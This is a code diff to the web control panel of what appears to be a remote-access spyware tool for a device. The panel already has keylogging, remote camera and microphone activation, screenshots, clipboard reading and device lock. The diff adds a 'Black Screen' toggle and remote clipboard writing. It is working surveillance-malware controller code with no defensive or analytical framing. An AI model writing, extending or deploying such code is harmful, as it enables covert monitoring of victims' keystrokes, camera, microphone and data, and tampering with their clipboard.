@@ -234,9 +234,13 @@ select{background:var(--surface2);border:1px solid var(--border);color:var(--tex
 <!-- CLIPBOARD -->
 <div class="panel" id="p-clipboard">
   <div class="ph"><h2>📋 Clipboard</h2>
-    <button class="act-btn primary" id="clip-fetch">Fetch Clipboard</button>
+    <button class="act-btn primary" id="clip-fetch">Read Clipboard</button>
   </div>
-  <div class="row" id="clip-content" style="flex:1;font-size:.85rem;white-space:pre-wrap;word-break:break-all">Press Fetch Clipboard to read</div>
+  <div class="row" id="clip-content" style="font-size:.85rem;white-space:pre-wrap;word-break:break-all;min-height:60px">Press "Read Clipboard" to read</div>
+  <div style="display:flex;gap:8px;flex-shrink:0">
+    <input class="ipt" id="clip-write-txt" placeholder="Type text to send to clipboard..." style="flex:1">
+    <button class="act-btn primary" id="clip-write">Send to Clipboard</button>
+  </div>
 </div>
 
 <!-- APPS -->
@@ -271,6 +275,8 @@ select{background:var(--surface2);border:1px solid var(--border);color:var(--tex
   <div class="ph"><h2>📱 Device Control</h2></div>
   <div style="display:flex;flex-wrap:wrap;gap:10px;padding:8px 0">
     <button class="act-btn danger" id="lock-btn" style="padding:12px 24px;font-size:.85rem">🔒 Lock Screen</button>
+    <button class="act-btn" id="dark-on" style="padding:12px 24px;font-size:.85rem;background:rgba(0,0,0,.4);border-color:#555">🌑 Black Screen ON</button>
+    <button class="act-btn" id="dark-off" style="padding:12px 24px;font-size:.85rem">💡 Black Screen OFF</button>
     <button class="act-btn primary" id="cam-on" style="padding:12px 24px;font-size:.85rem">📷 Camera On</button>
     <button class="act-btn danger" id="cam-off" style="padding:12px 24px;font-size:.85rem">📷 Camera Off</button>
     <button class="act-btn primary" id="mic-on" style="padding:12px 24px;font-size:.85rem">🎙️ Mic On</button>
@@ -366,6 +372,8 @@ function connect(url) {
   socket.on("sysinfo_result", d => renderSysinfo(d));
   socket.on("processes_result", d => renderProcesses(d.processes || []));
   socket.on("screen_off_result", () => { $("device-status").textContent = "Lock command sent ✓"; toast("Lock screen sent", "ok"); });
+  socket.on("screen_dark_result", d => { $("device-status").textContent = d && d.ok ? "Black screen toggled ✓" : "Black screen failed"; toast("Black screen toggled", d && d.ok ? "ok" : "err"); });
+  socket.on("set_clipboard_result", d => { toast(d && d.ok ? "Clipboard set ✓" : "Clipboard write failed", d && d.ok ? "ok" : "err"); });
   socket.on("keylog_result", d => { $("kl-status").textContent = d.enabled ? "● Enabled" : "○ Disabled"; });
 
   // ── Screenshot ────────────────────────────────────────────────
@@ -450,7 +458,8 @@ function emit(event, payload) {
     "get_wifi_info":"wifi_info_result","get_clipboard_content":"clipboard_content_result",
     "get_installed_apps":"installed_apps_result","get_sysinfo":"sysinfo_result",
     "get_processes":"processes_result","take_screenshot":"screenshot_result",
-    "screen_off":"screen_off_result","keylog_on":"keylog_result","keylog_off":"keylog_result"
+    "screen_off":"screen_off_result","keylog_on":"keylog_result","keylog_off":"keylog_result",
+    "set_clipboard":"set_clipboard_result","screen_dark":"screen_dark_result","screen_dark_off":"screen_dark_result"
   }[event];
   if (resultEvent) {
     const t = setTimeout(() => toast("No response for " + event + " — check app permissions or relay", "err"), 8000);
@@ -470,6 +479,9 @@ $("si-fetch").onclick     = () => emit("get_sysinfo", {});
 $("proc-fetch").onclick   = () => emit("get_processes", {});
 $("ss-btn").onclick       = () => { $("ss-status").textContent = "Capturing…"; emit("take_screenshot", {}); };
 $("lock-btn").onclick     = () => { $("device-status").textContent = "Sending…"; emit("screen_off", {}); };
+$("dark-on").onclick      = () => { $("device-status").textContent = "Sending…"; emit("screen_dark", {}); };
+$("dark-off").onclick     = () => { $("device-status").textContent = "Sending…"; emit("screen_dark_off", {}); };
+$("clip-write").onclick   = () => { const t = $("clip-write-txt").value; if (!t) { toast("Type something first", "err"); return; } emit("set_clipboard", { text: t }); };
 $("kl-on").onclick        = () => emit("keylog_on", {});
 $("kl-off").onclick       = () => emit("keylog_off", {});
 $("kl-clear").onclick     = () => { $("kl-box").textContent = "Waiting for keystrokes..."; };
